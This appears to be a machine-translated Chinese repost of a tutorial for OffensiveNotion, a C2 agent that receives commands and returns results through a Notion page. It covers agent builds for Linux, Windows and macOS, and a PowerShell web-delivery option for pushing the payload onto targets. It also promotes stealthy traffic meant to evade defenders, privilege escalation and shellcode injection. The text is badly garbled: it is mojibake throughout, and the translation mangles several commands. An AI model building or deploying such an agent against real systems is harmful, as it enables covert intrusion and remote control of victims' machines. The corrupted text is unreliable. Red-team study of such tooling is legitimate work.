# è¿›æ”»è¡ŒåŠ¨:ä½œä¸ºè¿›æ”»è¡ŒåŠ¨å¹³å°çš„æ¦‚å¿µ

> åŸæ–‡ï¼š<https://kalilinuxtutorials.com/offensivenotion/>

[![](img//78456edf1acc7f01cdbf84f36ef1a3f4.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8zSnksPwdiNd9bmOsWIDN_MZg6fcHxkTOgSAq6LfMn5dbEw9IhafuswJxguE5dJKK2f9o0fF8lG5ejap-m4Zd_igQthNIlymoSB9zBpHPStVZu9UQkveDTaXa8p_-n7Y9QpTKNSetrkAdFxpOPT9vRDt8uhxVE2pii6FipwF68cnGw9hpIKKTK9OF/s728/notion-beitragsbild.png)

**OffensiveNotion** å°†åå¼€å‘ä»£ç†çš„åŠŸèƒ½ä¸æ¦‚å¿µç¬”è®°åº”ç”¨çš„å¼ºå¤§å’Œèˆ’é€‚ç»“åˆåœ¨ä¸€èµ·ã€‚ä»£ç†å‘æ‚¨çš„æ¦‚å¿µé¡µé¢å‘é€æ•°æ®ï¼Œå¹¶ä»æ‚¨çš„æ¦‚å¿µé¡µé¢æ¥æ”¶å‘½ä»¤ã€‚å½“ä»£ç†æ¥æ”¶æŒ‡ä»¤å¹¶é€šè¿‡æ¦‚å¿µå¼€å‘è€… API å‘å¸ƒç»“æœæ—¶ï¼Œä½ çš„ C2 æµé‡å°±èå…¥è¿›æ¥äº†ã€‚å½“ä½ çš„è“é˜Ÿå¯»æ‰¾æ¶ä½œå‰§çš„è¯æ®æ—¶ï¼Œæ²¡æœ‰äººä¼šçŸ¥é“ã€‚

## ç‰¹å¾

*   åŸºäºæ¦‚å¿µç¬”è®°åº”ç”¨æ„å»ºçš„å…¨åŠŸèƒ½ C2 å¹³å°ã€‚
*   ç®€å•çš„è®¾ç½®:è®¾ç½®ä½ çš„æ¦‚å¿µå¼€å‘è€… API è´¦æˆ·ï¼Œå°†ä»£ç†æ”¾åˆ°ç›®æ ‡ä¸Šï¼Œè¿è¡Œå¹¶äº«å—ï¼
*   Rust ä¸­å†…ç½®çš„è·¨å¹³å°ä»£ç†å¯ä»¥ä½¿ç”¨ç›¸åŒçš„ä»£ç åº“ä¸º Linux å’Œ Windows ç¼–è¯‘ã€‚åŒ…æ‹¬ä¸€ä¸ª Python è®¾ç½®/æ§åˆ¶å™¨è„šæœ¬æ¥ç®€åŒ–è¿™ä¸ªè¿‡ç¨‹ã€‚
*   ä¸€ç³»åˆ—åŠŸèƒ½ï¼ŒåŒ…æ‹¬ç«¯å£æ‰«æã€æƒé™æå‡ã€å¼‚æ­¥å‘½ä»¤æ‰§è¡Œã€æ–‡ä»¶ä¸‹è½½å’Œå¤–å£³ä»£ç æ³¨å…¥ï¼Œæ‰€æœ‰è¿™äº›éƒ½å¯ä»¥ä»ä¸€ä¸ªæ¦‚å¿µé¡µé¢è½»æ¾æ§åˆ¶ï¼
*   ä¸€è¾¹èµ°ä¸€è¾¹è®°å½•ï¼ä»£ç†è¯†åˆ«è¿è¡Œå‘½ä»¤çš„ç‰¹æ®Šè¯­æ³•ï¼Œå› æ­¤å¯ä»¥éšæ„ä½¿ç”¨æ¦‚å¿µé¡µé¢çš„å…¶ä½™éƒ¨åˆ†æ¥è®°å½•æ‚¨çš„æ“ä½œã€‚
*   é€šè¿‡è®¾è®¡å®ç°åä½œï¼æ¦‚å¿µå…è®¸å¤šäººç¼–è¾‘å’ŒæŸ¥çœ‹æ‚¨çš„ç¬”è®°ã€‚æ‚¨çš„ç›‘å¬å™¨é¡µé¢å¯ä»¥å¤„ç†å¤šä¸ªä»£ç†ï¼Œå¹¶ä¸”æ‚¨å¯ä»¥é‚€è¯·æ‚¨çš„çº¢é˜Ÿæœ‹å‹è®¿é—®æ‚¨çš„é¡µé¢ã€‚æ­å–œï¼Œè¿™æ˜¯ä¸€ä¸ªå›¢é˜ŸæœåŠ¡å™¨ï¼
*   ç§»åŠ¨ C2ï¼ä½¿ç”¨ç§»åŠ¨è®¾å¤‡ä¸Šçš„æ¦‚å¿µåº”ç”¨ç¨‹åºï¼Œä»ä¸–ç•Œä»»ä½•åœ°æ–¹å‘æ‚¨çš„ä»£ç†å‘å‡ºå‘½ä»¤ã€‚
*   éšèº«ï¼C2 é€šä¿¡æœ¬èº«å°±è¶…è¶Šäº† API çš„æ¦‚å¿µã€‚ä½ çš„ C2 æµé‡çœ‹èµ·æ¥åƒæ˜¯æœ‰äººåœ¨ä¸ºå…¶é¢„æœŸç›®çš„ä½¿ç”¨æ¦‚å¿µã€‚

å¿«é€Ÿå¯åŠ¨

## TLï¼›é€Ÿåº¦ä¸‰è§’å½¢å®šä½æ³•(dead reckoning)

æˆ‘æ€ä¹ˆæ‰èƒ½è®©è¿™ä¸œè¥¿å·¥ä½œèµ·æ¥ï¼Œè¿™æ ·æˆ‘å°±èƒ½çŸ¥é“å®ƒèƒ½åšä»€ä¹ˆäº†ï¼Ÿ

1.  åšä¸€ä¸ªæ¦‚å¿µè´¦æˆ·
2.  è½¬åˆ°æ¦‚å¿µ API å¼€å‘è€…é¡µé¢å¹¶ç™»å½•ã€‚åˆ›å»ºä¸€ä¸ªé›†æˆç”¨æˆ·(`**New integration**`)ã€‚å¤åˆ¶è¯¥ç”¨æˆ·çš„ API å¯†é’¥ã€‚
3.  åœ¨ä½ çš„æ¦‚å¿µä¹¦ä¸Šå†™ä¸€é¡µ(ä»»ä½•ä¸€é¡µéƒ½å¯ä»¥)ã€‚è¿™æ˜¯ä½ çš„â€œå¬ä¼—â€å¤åˆ¶ URL çš„æœ€åä¸€éƒ¨åˆ†æˆ–åœ¨æ¡Œé¢åº”ç”¨ç¨‹åºä¸­æŒ‰ ctl+Lã€‚è¿™æ˜¯æ‚¨çš„çˆ¶é¡µé¢ IDã€‚æš‚æ—¶è·Ÿè¸ªä¸€ä¸‹ã€‚ç”¨æ¨ªå¹…å’Œè¡¨æƒ…å›¾æ ‡è£…é¥°ä½ çš„é¡µé¢ã€‚å¥½å¥½äº«å—å§ã€‚
4.  åœ¨æ‚¨çš„è§‚ç‚¹é¡µé¢çš„å³ä¸Šè§’ï¼Œå•å‡»â€œå…±äº«â€å’Œâ€œé‚€è¯·â€å°†æ‚¨çš„æ¦‚å¿µå¼€å‘è€… API å¸æˆ·æ·»åŠ åˆ°æ­¤é¡µé¢ã€‚
5.  ä»å‘å¸ƒéƒ¨åˆ†ä¸‹è½½ Linux è°ƒè¯•ä»£ç†ã€‚
6.  åœ¨è°ƒè¯•æ¨¡å¼(`**-d**`)ä¸‹è¿è¡Œå‘å¸ƒä»£ç†ï¼Œå¹¶è¾“å…¥æ¯ä¸ªæç¤ºçš„å€¼ã€‚

**husky @ Ubuntu:~/Desktop/offensive notion/bin/Linux _ debug/debug $ã€‚/offensive _ opinion-d
[*]é¦–å‘ï¼æ­£åœ¨è·å–é…ç½®é€‰é¡¹ï¼[* ]è¾“å…¥ä»£ç†ç¡çœ é—´éš”> 5
[ *]è¾“å…¥ä»£ç†æŠ–åŠ¨æ—¶é—´> 0 [* ]è¾“å…¥çˆ¶é¡µé¢ id>[â€¦æ‚¨çš„çˆ¶é¡µé¢ ID..]
[ *]è¾“å…¥ API å¯†é’¥>[â€¦æ‚¨çš„ API å¯†é’¥â€¦â€¦][*]è¾“å…¥é…ç½®æ–‡ä»¶è·¯å¾„>
ã€ç•™ç©ºã€‘
[*]è¾“å…¥æ—¥å¿—çº§åˆ«(1-4) >
2**

*   æ‚¨çš„ä»£ç†ç°åœ¨åº”è¯¥æ£€æŸ¥æ‚¨çš„ç›‘å¬å™¨é¡µé¢:
*   è¿è¡Œå‘½ä»¤ï¼åšä¸€ä¸ªå¾…åŠå—(è§‚å¿µ app é‡Œçš„`**/todo**`ï¼Œè¾“å…¥`**shell whoami ğŸ¯**`ï¼Œçœ‹é­”æœ¯å±•å¼€ã€‚

## ç å¤´å·¥äºº

ä½¿ç”¨æ‚¨è‡ªå·±çš„å®šåˆ¶é…ç½®æ¥æ„å»ºè¿›æ”»ä»£ç†çš„æœ€ä½³æ–¹å¼æ˜¯ä½¿ç”¨ Docker å’Œ`**main.py**`è„šæœ¬ã€‚è¿™æ˜¯æ•´ä¸ªæ“ä½œçš„äº¤é’¥åŒ™ç‚¹ã€‚

ä½¿ç”¨ä¸¤ä¸ª Docker å‘½ä»¤ï¼Œæ‚¨å¯ä»¥æ„å»ºç¼–è¯‘ä»£ç†çš„å®¹å™¨ï¼Œåœ¨æºä»£ç ä¸­è®¾ç½®å®ƒçš„æ‰€æœ‰é…ç½®ï¼Œç¼–è¯‘å®ƒï¼Œå¹¶è®©å®ƒåœ¨æ‚¨çš„ç‰©ç†ä¸»æœºä¸Šå¯ç”¨ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥å†æ¬¡è¿è¡Œå‘½ä»¤ï¼Œå¹¶æ ¹æ®éœ€è¦æ›´æ”¹é…ç½®ã€‚

## æ„å»ºå’Œè¿è¡Œå®¹å™¨

è¿™åœ¨ Linux ä¸Šæ•ˆæœæœ€å¥½ã€‚å½“ç„¶ï¼Œä½ éœ€è¦ Dockerã€‚ä¸€æ—¦å®‰è£…äº† Dockerï¼Œå…‹éš† repo å¹¶å°† dir æ›´æ”¹ä¸º repoã€‚

### ç å¤´å·¥äººå»ºé€ 

è¦æ„å»ºå®¹å™¨:

**$ sudo åç«™æ˜ åƒæ„å»º-t æ”»å‡»æ¦‚å¿µã€‚**

### ç å¤´è¿è¡Œ

ä½¿ç”¨ä»¥ä¸‹ Docker è¿è¡Œå‘½ä»¤ä½œä¸ºåŸºç¡€:

**$ sudo dock RM-f æ”»å‡»æ¦‚å¿µ&&sudo dock container run-v $(pwd):/outâ€“name æ”»å‡»æ¦‚å¿µ-it æ”»å‡»æ¦‚å¿µ-o linux -b ç‰ˆæœ¬**

â€¦å…¶ä¸­:

*   **`sudo docker rm -f offensivenotion`** åˆ é™¤å®¹å™¨çš„ä»»ä½•è¿è¡Œå®ä¾‹ã€‚
*   `**-v $(pwd):/out**`å°†ä¸»æœºä¸Šçš„æ”»å‡»æ€§å›è´­æ˜ å°„åˆ°å®¹å™¨ä¸­çš„`**/out**`ç›®å½•ã€‚TLï¼›dr:ç¼–è¯‘å®Œæˆåï¼Œä½ çš„ä»£ç†ä¼šåœ¨é‚£é‡Œã€‚
*   `**-o linux -b release**`æ˜¯æ„å»ºè„šæœ¬å‚æ•°çš„é›†åˆã€‚

`**-it offensivenotion**`ä¹‹åçš„æ‰€æœ‰å†…å®¹éƒ½æ˜¯`**main.py**`è„šæœ¬çš„å‚æ•°ã€‚ä½ è¯´,`**main.py**`çš„å‰§æœ¬æ˜¯ä»€ä¹ˆï¼Ÿ

### `main.py`

è¿™ä¸ªè„šæœ¬æ˜¯å®¹å™¨çš„å…¥å£ç‚¹ï¼Œå¤„ç†åˆ›å»ºä¸€ä¸ªæ”»å‡»æ€§é€šçŸ¥ä»£ç†æ‰€éœ€çš„ä¸€åˆ‡ã€‚å®ƒè¯»å…¥æ‚¨æƒ³è¦åˆ›å»ºçš„ä»£ç†ç±»å‹(Linuxã€Windows æˆ– macOS)ï¼Œåœ¨æºä»£ç ä¸­è®¾ç½®é…ç½®ï¼Œç¼–è¯‘ä»£ç†ï¼Œå¹¶ä¸ºæ‚¨é‡ç½®æºä»£ç ã€‚

å®ƒè¿˜å¯ä»¥åšä¸€äº›æœ‰è¶£çš„äº‹æƒ…ï¼Œå¦‚ç½‘ç»œäº¤ä»˜å’Œ C2 æ£€æŸ¥ã€‚ç¨åå°†è¯¦ç»†ä»‹ç»è¿™äº›å†…å®¹ã€‚

æŸ¥çœ‹`**main.py**`çš„å®Œæ•´ç”¨æ³•ï¼Œäº†è§£æ‚¨çš„é€‰æ‹©:

**python3 main.py -h
ç”¨æ³•:main.py [-h] [-o {linuxï¼Œwindowsï¼Œmacos}] [-b {debugï¼Œrelease }][-c][-w]
[-m { powershellï¼Œwget-linuxï¼Œwget-pshï¼Œpython-linuxï¼Œpython-windows }][-IP HOSTIP][-p PORT]
offensive venotion è®¾ç½®ã€‚å¿…é¡»ä»¥ root ç”¨æˆ·èº«ä»½è¿è¡Œã€‚åœ¨å®¹å™¨ä¸­ç”Ÿæˆæ”»å‡»ä»£ç†ã€‚
å¯é€‰å‚æ•°:
-hï¼Œâ€“help æ˜¾ç¤ºæ­¤å¸®åŠ©ä¿¡æ¯å¹¶é€€å‡º
-o {linuxï¼Œwindowsï¼Œmacos}ï¼Œâ€“OS { Linuxï¼Œwindowsï¼Œmacos}
ç›®æ ‡ OS
-b {debugï¼Œrelease}ï¼Œâ€“build { debugï¼Œrelease}
äºŒè¿›åˆ¶ç¼–è¯‘
-cï¼Œâ€“C2 lint C2 æ—ç‰¹å°”ã€‚é€šè¿‡åœ¨æ‚¨çš„ç›‘å¬å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæµ‹è¯•é¡µé¢æ¥æ£€æŸ¥æ‚¨çš„ C2 é…ç½®ã€‚
-wï¼Œâ€“webdelivery å¯åŠ¨ web delivery æœåŠ¡å™¨æ¥æ‰˜ç®¡å’Œäº¤ä»˜æ‚¨çš„ä»£ç†ã€‚æä¾›æ–¹ä¾¿çš„è¡¬ç®¡åœ¨
ç›®æ ‡ä¸Šè¿è¡Œã€‚
-m {powershellï¼Œwget-linuxï¼Œwget-pshï¼Œpython-linuxï¼Œpython-windows}ï¼Œâ€“Method { powershellï¼Œwget-linuxï¼Œwget-pshï¼Œpython-linuxï¼Œpython-windows }
Web äº¤ä»˜æ–¹æ³•
-ip HOSTipï¼Œâ€“HOSTIP HOSTIP
Web æœåŠ¡å™¨ä¸»æœº IPã€‚
-p ç«¯å£ï¼Œâ€“PORT ç«¯å£ Web æœåŠ¡å™¨ä¸»æœºç«¯å£ã€‚**

å”¯ä¸€éœ€è¦çš„ä¸¤ä¸ªå‚æ•°æ˜¯ç”¨äºæ“ä½œç³»ç»Ÿçš„`**-o**`å’Œç”¨äºæ„å»º(è°ƒè¯•æˆ–å‘å¸ƒ)çš„`**-b**`ã€‚å…¶ä»–å‚æ•°åŒ…å«åœ¨ Misc éƒ¨åˆ†ã€‚

å¦‚æœæ²¡æœ‰ä¼ å…¥ build å’Œ OS å‚æ•°ï¼Œå®ƒé»˜è®¤ä¸º Linux è°ƒè¯•ä»£ç†ã€‚

è„šæœ¬è¿è¡Œåï¼ŒæŒ‰ç…§æç¤ºæ‰§è¡Œå®‰è£…ã€‚æ‚¨å°†è¾“å…¥ API é”®å’Œçˆ¶é¡µé¢ IDã€‚å…³äºè¿™äº›çš„æ›´å¤šä¿¡æ¯å¯ä»¥åœ¨ä¸‹ä¸€èŠ‚â€œè®¾ç½®â€ä¸­æ‰¾åˆ°ã€‚

æœ€åï¼Œæ‚¨å°†åœ¨å›è´­çš„ä¸»ç›®å½•ä¸­æ‹¥æœ‰ä¸€ä¸ªä»£ç†ã€‚

### Docker Run çš„æ›´å¤šç¤ºä¾‹

#### æˆ‘æƒ³æ„å»ºä¸€ä¸ªç”¨äºæµ‹è¯•çš„ Linux è°ƒè¯•ä»£ç†:

**$ sudo dock RM-r æ”»å‡»æ¦‚å¿µ&&sudo dock container run-v $(pwd):/outâ€“name æ”»å‡»æ¦‚å¿µ-it æ”»å‡»æ¦‚å¿µ**

**æˆ‘æƒ³åšä¸€ä¸ª Windows å‘å¸ƒä»£ç†:**

**$ sudo dock RM-r æ”»å‡»æ¦‚å¿µ&&sudo dock container run-v $(pwd):/outâ€“name æ”»å‡»æ¦‚å¿µ-it æ”»å‡»æ¦‚å¿µ-o windows -b ç‰ˆæœ¬**

**æˆ‘æƒ³è¯•è¯•å¤§å®¶éƒ½åœ¨è°ˆè®ºçš„é‚£ä¸ªå¾ˆé…·çš„ macOS ä»£ç†ï¼Œå‘å¸ƒç‰ˆæœ¬:**

**$ sudo dock RM-r æ”»å‡»æ¦‚å¿µ&&sudo dock container run-v $(pwd):/outâ€“name æ”»å‡»æ¦‚å¿µ-it æ”»å‡»æ¦‚å¿µ-o macos -b ç‰ˆæœ¬**

**æˆ‘æƒ³æ„å»ºä¸€ä¸ª Linux å‘å¸ƒä»£ç†ï¼Œå¹¶æ£€æŸ¥ä»¥ç¡®ä¿æˆ‘çš„ API é”®å’Œçˆ¶é¡µé¢æ˜¯å¥½çš„:**

**$ sudo dock RM-r æ”»å‡»æ¦‚å¿µ&&sudo dock container run-v $(pwd):/outâ€“name æ”»å‡»æ¦‚å¿µ-it æ”»å‡»æ¦‚å¿µ-o linux -b ç‰ˆæœ¬â€“C2 lint**

#### æˆ‘æƒ³åˆ¶ä½œä¸€ä¸ª Windows ç‰ˆæœ¬çš„æœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶ä¸º web äº¤ä»˜æ‰˜ç®¡å®ƒ

(é‡å…½èˆ¬çš„å‘½ä»¤ä¼ æ¥)

**$ sudo docker RM-f offensive notion&&sudo docker å®¹å™¨ run-p 80:80-v $(pwd):/out-itâ€“name offensive notion offensive notion-o windows-b release-w-IP 10 . 10 . 1 . 237â€“port 80-m powershell**

(æˆ‘ä»¬æ¥åˆ†è§£ä¸€ä¸‹)

â€¦å…¶ä¸­:

*   `**sudo docker rm -f offensivenotion**`åˆ é™¤å®¹å™¨çš„ä»»ä½•è¿è¡Œå®ä¾‹ã€‚
*   `**sudo docker container run**`å¯åŠ¨ä¸€ä¸ªå®¹å™¨ã€‚
*   `**-p 80:80**`å‘å¸ƒå®¹å™¨çš„ç«¯å£ï¼Œå¹¶è½¬å‘ç»™ç‰©ç†ä¸»æœºã€‚ç¡®ä¿è¿™ä¸è¯¥å‘½ä»¤æœ€åéƒ¨åˆ†çš„`**--port**`å‚æ•°ç›¸åŒ¹é…ã€‚
*   `**-v $(pwd):/out**`å°†ä¸»æœºä¸Šçš„å½“å‰å·¥ä½œç›®å½•æŒ‚è½½ä¸ºå®¹å™¨ä¸Šçš„å·ã€‚æ‚¨çš„`**config.json**`å’Œæœ‰æ•ˆè´Ÿè½½è¢«ç§»åˆ°è¿™é‡Œï¼Œè¿™æ ·å®ƒä»¬æœ€ç»ˆä¼šåœ¨æ‚¨çš„ç‰©ç†ä¸»æœºä¸Šï¼Œä»¥é˜²æ‚¨æƒ³è¦é‡ç”¨å®ƒä»¬ã€‚
*   `**-it --name offensivenotion offensivenotion**`:æŠŠæˆ‘æ”¾åœ¨å®¹å™¨ä¸­çš„ä¸€ä¸ªäº¤äº’ç»ˆç«¯(éœ€è¦å’Œ`**main.py**`äº¤äº’)ï¼Œè°ƒç”¨å®¹å™¨ offensivenotionï¼Œä½¿ç”¨æˆ‘ä»¬ä¹‹å‰æ­å»ºçš„ offensivenotion é•œåƒã€‚
*   `**-o windows -b release -w -ip 10.10.1.237 --port 80 -m powershell**`:è¿™é‡Œæ‰€æœ‰çš„ä¸œè¥¿éƒ½æ˜¯`**main.py**`çš„å‚æ•°ï¼Œä½ å¯ä»¥åœ¨ main.py ç”¨æ³•ä¸­æ‰¾åˆ°(è§ä¸Š)ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåˆ›å»ºä¸€ä¸ª windows release æœ‰æ•ˆè´Ÿè½½ï¼Œæ‰“å¼€ web äº¤ä»˜ï¼Œå°†æ­¤ IP åœ°å€å’Œæ­¤ç«¯å£ç”¨äºä¸‹è½½æ”¯æ¶ï¼Œå¹¶ä½¿ç”¨ PowerShell åˆ›å»ºä¸€è¡Œç¨‹åºã€‚

è®¾ç½®

## è®¾ç½®æ‚¨çš„æ¦‚å¿µå¼€å‘è€… API å¸æˆ·(å®Œæ•´è¯´æ˜)

æ¦‚å¿µ API ä½¿ç”¨å¯ä»¥æ·»åŠ åˆ°é¡µé¢çš„ç‰¹æ®Š API å¸æˆ·ã€‚è¿™åˆ›å»ºäº†ä¸€ä¸ªåŒå‘ä¿¡ä»»ï¼Œåªå…è®¸å…·æœ‰ç‰¹å®š API å¯†é’¥çš„ç‰¹å®š API ç”¨æˆ·å¸æˆ·è®¿é—®ç‰¹å®šé¡µé¢ã€‚è¿™é‡Œçš„ OPSEC å¾ˆæ£’ï¼

é¦–å…ˆï¼Œå‰å¾€ https://developers.notion.com/ï¼Œä½¿ç”¨æ‚¨çš„å¸¸è§„æ¦‚å¿µå¸æˆ·ç™»å½•ã€‚

æ¥ä¸‹æ¥ï¼Œç‚¹å‡»å³ä¸Šè§’çš„â€œæˆ‘çš„é›†æˆâ€:

## è®¾ç½®ç›‘å¬ç¨‹åºé¡µé¢(å®Œæ•´è¯´æ˜)

â€œå€¾å¬è€…â€åªæ˜¯è§‚å¿µç¬”è®°æœ¬ä¸­çš„ä¸€é¡µã€‚ä½†æ˜¯æ‚¨å¯ä»¥è®¾ç½®å®ƒæ¥ä¸ºæ‚¨çš„ä»£ç†æ•æ‰å›ç”µ:

åˆ›å»ºæ‚¨çš„ä¾¦å¬å™¨é¡µé¢ã€‚ä¸ºæƒ³æ³•æ·»åŠ æ–°çš„ä¸€é¡µï¼Œæœ€å¥½æ˜¯åœ¨æ²¡æœ‰ç”¨äºä»»ä½•å…¶ä»–ç”¨é€”çš„ç¬”è®°æœ¬ä¸­:

å¤åˆ¶ä½ çš„ç½‘é¡µçš„ç½‘å€ã€‚å¦‚æœä½ åœ¨ web æµè§ˆå™¨æ¦‚å¿µå®¢æˆ·ç«¯ï¼Œè¿™å¯ä»¥ä»é¡µé¢çš„ URL ä¸­è·å–ã€‚åœ¨æ¡Œé¢åº”ç”¨ç¨‹åºä¸­ï¼Œè¾“å…¥ ctl-l å°†å…¶å¤åˆ¶åˆ°å‰ªè´´æ¿ã€‚

å¦‚æœæ‚¨çš„ç›‘å¬å™¨ URL æ˜¯:

https://www.notion.so/LISTENER-11223344556677889900112233445566

â€¦é‚£ä¹ˆæ‚¨çš„çˆ¶é¡µé¢ ID å°±æ˜¯ä¾¦å¬å™¨åç§°åé¢çš„æ•°å­—ã€‚è¿™ç§æƒ…å†µä¸‹å°±æ˜¯`**11223344556677889900112233445566**`ã€‚è¿™ä¸ªå€¼ç”¨äºå°†æ‚¨çš„ä»£ç†è¿æ¥åˆ°æ‚¨çš„ä¾¦å¬å™¨ï¼Œæ‰€ä»¥è¯·è·Ÿè¸ªå®ƒï¼

æ‚¨ç°åœ¨å¯ä»¥è¿è¡Œä»£ç†äº†ï¼

ä»æºä»£ç æ„å»º

åšè¿è¥ä»£ç†æœ€å¥½çš„æ–¹æ³•å°±æ˜¯è·Ÿ Docker å’Œ`**main.py**`ã€‚å¿«é€Ÿå…¥é—¨æŒ‡å—ä¸­ä»‹ç»äº†è¿™ä¸€è¿‡ç¨‹ã€‚ä½†æ˜¯å¦‚æœæ‚¨æ›´æ„¿æ„ä»æºä»£ç æ„å»ºä»£ç†ï¼Œæ‚¨ä¹Ÿå¯ä»¥è¿™æ ·åšã€‚

å¦‚æœæ‚¨ä»æºä»£ç æ„å»ºï¼Œæˆ‘ä»¬å»ºè®®ä½¿ç”¨ Linux ä¸»æœºæ¥æ„å»ºä»£ç†ä»¥ç®€åŒ–è¿‡ç¨‹ã€‚

## å®‰è£…é“é”ˆ

åœ¨ Linux/macOS ä¸Šï¼Œæ‚¨å¯ä»¥è¿è¡Œ:

**$ curlâ€“proto ' = https 'â€“tlsv 1.2-SSF https://sh . rusup . RS | sh**

## æ„å»ºä»£ç†

ä¸‹è½½ OffensiveNotion å­˜å‚¨åº“ï¼Œè½¬åˆ°`**agent/**`ç›®å½•ã€‚

Cargo ä½¿ç”¨æ‰€è°“çš„â€œç›®æ ‡ä¸‰å…ƒç»„â€æ¥æŒ‡ç¤ºç¼–è¯‘åˆ°ä»€ä¹ˆå¹³å°ã€‚è¦æŸ¥çœ‹ä½ å·²ç»å®‰è£…äº†å“ªäº›ï¼Œè¿è¡Œ **`rustup target list`ã€‚**

æœ¬æœºç›®æ ‡(Linux ä¸Šçš„ Linuxã€Windows ä¸Šçš„ Windowsã€macOS ä¸Šçš„ macOS)æ— éœ€é¢å¤–é…ç½®å³å¯å·¥ä½œã€‚æˆ‘ä»¬å°†åœ¨åé¢çš„éƒ¨åˆ†è®¨è®ºäº¤å‰ç¼–è¯‘ã€‚

é™¤äº†ç›®æ ‡ä¸‰å…ƒç»„ï¼Œæ‚¨è¿˜å¯ä»¥æ„å»ºä¸€ä¸ª`**debug**`æˆ–`**release**`ç›®æ ‡ã€‚`**debug**`é€‚åˆæµ‹è¯•ï¼Œä½†æ˜¯`**release**`åº”è¯¥æ˜¯åœ¨çº¦å®šæœŸé—´éƒ¨ç½²çš„å”¯ä¸€ç‰ˆæœ¬ã€‚

### Linux

ä»`**agent**/`ç›®å½•ä¸­ï¼Œè¿è¡Œ:

**$ cargo build[â€“release]**

â€¦æ„å»º Linux è°ƒè¯•æˆ–å‘å¸ƒä»£ç†ã€‚

ä»£ç†æ„å»ºåœ¨`**target/**`å­ç›®å½•ä¸­ã€‚

### Windows(æ¥è‡ª Linux)

æˆ‘ä»¬å»ºè®®ä» Linux ç¼–è¯‘åˆ° Windowsï¼Œå› ä¸ºè€å®è¯´ï¼Œè¿™æ ·æ›´å¥½ã€‚æ­¤å¤–ï¼Œæ‚¨å¯ä»¥æ›´å¥½åœ°æ§åˆ¶æäº¤ç»™ Defender çš„æ ·æœ¬ã€‚

å®‰è£… Windows å·¥å…·é“¾:

**åœ¨ Linux ä¸Šæ„å»º Windows åº”ç”¨çš„ MingW å·¥å…·
apt install-y MingW-w64
rust up å·¥å…·é“¾ install stable-x86 _ 64-PC-Windows-GNU**

â€¦å¹¶æ„å»ºä»£ç†:

**$ cargo buildâ€“ç›®æ ‡ x86 _ 64-PC-windows-GNU[â€“release]**

ä»£ç†æ„å»ºåœ¨`**target/x86_64-pc-windows-gnu/**`å­ç›®å½•ä¸­ã€‚

### è‹¹æœç”µè„‘

åœ¨ macOS ä¸Šè¿›è¡ŒåŸç”Ÿæ„å»ºç›¸å½“ç®€å•ã€‚å¦‚ä¸Šæ‰€è¿°ï¼Œè¯·éµå¾ªä»¥ä¸‹æ­¥éª¤:

1.  æŒ‰ç…§ rustup.rs ä¸Šçš„è¯´æ˜å®‰è£… Rust
2.  å…‹éš†æ”»å‡»æ€§ GitHub åº“ã€‚
3.  `**cd**`åˆ°`**agent**`ç›®å½•ã€‚

ç°åœ¨ï¼Œåœ¨è¿è¡Œ`**cargo build**`ä¹‹å‰ï¼Œæ‚¨éœ€è¦ç¡®ä¿ XCode å‘½ä»¤è¡Œå·¥å…·å·²ç»å®‰è£…ã€‚å¦‚æœæ‚¨ä¹‹å‰å·²ç»è®¾ç½®äº† XCodeï¼Œé‚£ä¹ˆæ‚¨å·²ç»è®¾ç½®å¥½äº†ã€‚å¦åˆ™ï¼Œåœ¨ç»ˆç«¯ä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤:

**xcode-é€‰æ‹©-å®‰è£…**

å¿…è¦çš„å·¥å…·(`**clang**`ç­‰)ã€‚)ç°åœ¨å·²ç»å¯ä»¥ä½¿ç”¨äº†ã€‚æ‚¨ç°åœ¨å¯ä»¥è¿è¡Œ`**cargo build --release**`ã€‚ç»“æœä¼šåœ¨`**agent**`é‡Œé¢çš„`**target/release/**`ç›®å½•ä¸­ã€‚

#### ä» Linux äº¤å‰ç¼–è¯‘åˆ° macOSã€‚

äº‹å®ä¸Šï¼Œä» Linux äº¤å‰ç¼–è¯‘åˆ° macOS æ˜¯å¯èƒ½çš„ã€‚è¿™ç¯‡åšæ–‡åŒ…å«äº†è¿™æ ·åšæ‰€å¿…éœ€çš„é™„åŠ è¯´æ˜ã€‚å‡ ä¸ªé—®é¢˜:

*   ç¡®ä¿`**linker**`å’Œ`**ar**`é€‰é¡¹çš„é™„åŠ é…ç½®åœ¨`**agent/.cargo/config**`ä¸­ã€‚ç›®å‰ï¼Œ`**.cargo**`æ–‡ä»¶å¤¹ä¸å­˜åœ¨ã€‚
*   å¦‚æœæ‚¨ä¸æƒ³æ·»åŠ è¯¥æ–‡ä»¶å¤¹/æ–‡ä»¶ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹é€‰é¡¹è¿è¡Œ cargo:
    *   `**CARGO_TARGET_x86_64_APPLE_DARWIN_LINKER=x86_64-apple-dawrin14-clang CARGO_TARGET_x86_64_APPLE_DARWIN_AR=x86_64_apple-darwin14-ar cargo build --release --target x86_64-apple-darwin**`
*   ç¡®ä¿åœ¨å…‹éš†/æ„å»º OSXCross ä¹‹åï¼Œå°†å®ƒçš„`**bin**`æ–‡ä»¶å¤¹æ·»åŠ åˆ°ä½ çš„`**$PATH**`çš„å‰é¢ã€‚

æ‰§è¡Œä»£ç†

ç¼–è¯‘åçš„ä»£ç†å¯ä»¥ç”¨å‡ ä¸ªä¸åŒçš„å‚æ•°è¿è¡Œã€‚å¯¹äºå·²ç¼–è¯‘çš„ä»£ç†ï¼Œæ²¡æœ‰å¸®åŠ©èœå•ï¼Œå› æ­¤è¯·å‚è€ƒä»¥ä¸‹å†…å®¹äº†è§£å…¶å¯èƒ½çš„å‚æ•°:

### æ²¡æœ‰äº‰è®º

å¦‚æœä»£ç†å·²ç»ä½¿ç”¨å…¶å‚æ•°çš„é»˜è®¤å€¼è¿›è¡Œäº†ç¼–è¯‘(å³é€šè¿‡ä½¿ç”¨`**m**ain.py`è¿›è¡Œè®¾ç½®)ï¼Œä»£ç†åœ¨ä¸å¸¦å‚æ•°è¿è¡Œæ—¶å°†ä½¿ç”¨è¿™äº›å€¼ã€‚**è¿™æ˜¯å¤„å†³ç‰¹å·¥æœ€å®‰å…¨çš„æ–¹å¼ã€‚**å‚è§å¿«é€Ÿå…¥é—¨æŒ‡å—å’Œ`**main.py**`äº†è§£æ›´å¤šä¿¡æ¯ã€‚

